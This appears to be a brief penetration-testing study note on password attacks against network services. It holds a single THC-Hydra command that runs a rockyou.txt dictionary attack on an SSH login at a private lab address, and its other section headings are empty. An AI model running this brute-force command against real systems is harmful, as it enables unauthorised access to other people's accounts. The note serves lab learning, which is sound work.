[[Notes/Password Attacks|Password Attacks]]

# Attacking Network Service Logins
## SSH and RDP logins
### THC-Hydra
TAGS: #hydra #password-cracking #dictionary-attack #ssh #rdp
```shell
# unzip if it wasn't already
sudo gzip -d rockyou.txt.gz

# simple hydra command
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

## HTTP POST login forms


# Password Cracking

# Working with Hashes
